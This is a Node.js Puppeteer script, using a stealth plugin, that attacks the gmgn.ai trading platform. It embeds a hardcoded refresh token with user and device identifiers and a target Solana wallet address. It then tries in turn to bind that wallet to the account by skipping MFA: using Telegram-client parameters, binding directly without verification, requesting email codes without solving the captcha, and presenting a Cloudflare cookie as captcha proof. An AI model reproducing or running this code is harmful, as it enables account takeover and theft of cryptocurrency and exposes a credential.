const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const FRESH_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiJhMWQ2ZGZlNC1iODhmLTRjNTgtOThkYi00MmU0MmFhMjRmZDYiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzUyNDIxLCJpYXQiOjE3ODQxNjA0MjEsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOGI5MGIxMzktODAzYi00NDNiLWE4OWYtYTIyYTgwYmE2OGI2IiwibmJmIjoxNzg0MTYwNDIxLCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiYTFkNmRmZTQtYjg4Zi00YzU4LTk4ZGItNDJlNDJhYTI0ZmQ2IiwidmVyIjoiMS4wIn0.5G4VW1NtqC9JPF-gaEnIE3bjOp1KIA01ROcTEoIy7QxQzwKIJJy37Zit7ON5TrXyyCZFNSt2cHbbj6z1_jijMA';
const TARGET = '5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU';

(async () => {
    console.log('🔥 TG BYPASS + BROWSER');
    const browser = await puppeteer.launch({headless: false, args: ['--no-sandbox']});
    const page = await browser.newPage();
    await page.goto('https://gmgn.ai', {waitUntil: 'networkidle2', timeout: 25000});
    await new Promise(r => setTimeout(r, 4000));
    
    const result = await page.evaluate(async (refresh, target) => {
        const log = [];
        const webP = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&fp_did=4e8cc7f90484bd356291ff79db6b9b09&client_id=gmgn_web_20260715-2161-18d5b10&from_app=gmgn&app_ver=20260715-2161-18d5b10&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0';
        const tgP = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&client_id=gmgn_tg_bot&from_app=tg';
        
        try {
            // Token (no params needed)
            let r = await fetch('/account/account/refresh_access_token', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({refresh_token: refresh})
            });
            let text = await r.text();
            let data;
            try { data = JSON.parse(text); } catch(e) { return {error: 'non-json', text: text.substring(0,200)}; }
            if (data.code !== 0) return {error: 'token: ' + data.message};
            const token = data.data.data.token;
            const h = {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token};
            log.push('✅ Token');
            
            // TRY 1: Generate bind MFA with TG params
            log.push('=== TG PARAMS ===');
            r = await fetch('/account/account/generate_mfa_params?' + tgP, {
                method: 'POST', headers: h,
                body: JSON.stringify({usage: 'bind_wallet', biz_params: {address: target, wallet_type: 'sol', chain: 'sol'}})
            });
            data = await r.json();
            log.push('TG mfa: ' + data.code + ' ' + (data.message||''));
            
            if (data.code === 0) {
                const items = data.data?.data?.verify_items || [];
                log.push('TG verify_items: ' + items.length + ' → ' + JSON.stringify(items).substring(0,150));
                
                if (items.length === 0) {
                    log.push('💀 NO MFA ON TG!');
                    const txn = data.data.data.txn_id;
                    r = await fetch('/account/bind_wallet?' + tgP, {
                        method: 'POST', headers: h,
                        body: JSON.stringify({address: target, wallet_type: 'sol', chain: 'sol', txn_id: txn})
                    });
                    data = await r.json();
                    log.push('BIND (TG): ' + JSON.stringify(data));
                    return {log, success: data.code === 0};
                }
            }
            
            // TRY 2: Normal params, get txn, try bind directly without MFA
            log.push('=== DIRECT BIND (skip MFA) ===');
            r = await fetch('/account/account/generate_mfa_params?' + webP, {
                method: 'POST', headers: h,
                body: JSON.stringify({usage: 'bind_wallet', biz_params: {address: target, wallet_type: 'sol', chain: 'sol'}})
            });
            data = await r.json();
            if (data.code !== 0) return {error: 'mfa: ' + data.message, log};
            const txnId = data.data.data.txn_id;
            log.push('txn_id: ' + txnId);
            
            // Try bind directly
            r = await fetch('/account/bind_wallet?' + webP, {
                method: 'POST', headers: h,
                body: JSON.stringify({address: target, wallet_type: 'sol', chain: 'sol', txn_id: txnId})
            });
            data = await r.json();
            log.push('Direct bind: ' + data.code + ' ' + (data.message||''));
            
            if (data.code === 0) return {log, success: true};
            
            // TRY 3: fetch_captcha then skip verify, go to email directly
            log.push('=== SKIP CAPTCHA → EMAIL ===');
            r = await fetch('/account/mfa/txn/v1/fetch_captcha?' + webP, {
                method: 'POST', headers: h,
                body: JSON.stringify({usage: 'bind_wallet', txn_id: txnId})
            });
            data = await r.json();
            if (data.code !== 0) { log.push('fetch_captcha: ' + data.message); return {log}; }
            const rid = data.data.request_id;
            log.push('request_id: ' + rid);
            
            // Try sending email code WITHOUT solving captcha first
            const emailPaths = [
                '/account/mfa/txn/v1/fetch_email_code',
                '/account/mfa/txn/v1/send_email_code', 
                '/account/mfa/txn/v1/fetch_email',
            ];
            
            for (const ep of emailPaths) {
                r = await fetch(ep + '?' + webP, {
                    method: 'POST', headers: h,
                    body: JSON.stringify({txn_id: txnId, usage: 'bind_wallet', request_id: rid})
                });
                if (r.status === 404) continue;
                data = await r.json();
                log.push(ep.split('/').pop() + ': ' + data.code + ' ' + (data.message||'').substring(0,50));
                if (data.code === 0) {
                    log.push('💀💀💀 EMAIL SENT WITHOUT CAPTCHA!!!');
                    return {log, emailSent: true, txnId};
                }
            }
            
            // TRY 4: verify_captcha with the Cloudflare __cf_bm token as captcha_data
            // Maybe the CF cookie IS the captcha proof?
            log.push('=== CF COOKIE AS CAPTCHA ===');
            const cfToken = document.cookie.match(/__cf_bm=([^;]+)/)?.[1] || '';
            r = await fetch('/account/mfa/txn/v1/verify_captcha?' + webP, {
                method: 'POST', headers: h,
                body: JSON.stringify({
                    txn_id: txnId, request_id: rid, usage: 'bind_wallet',
                    captcha_type: 'cloudflare', captcha_data: cfToken
                })
            });
            data = await r.json();
            log.push('CF token verify: ' + data.code + ' ' + (data.message||''));
            if (data.code === 0) return {log, success: true, method: 'cf_cookie'};
            
            return {log, txnId, rid};
        } catch(e) { return {error: e.message, log}; }
    }, FRESH_REFRESH, TARGET);
    
    console.log(JSON.stringify(result, null, 2));
    await browser.close();
})();
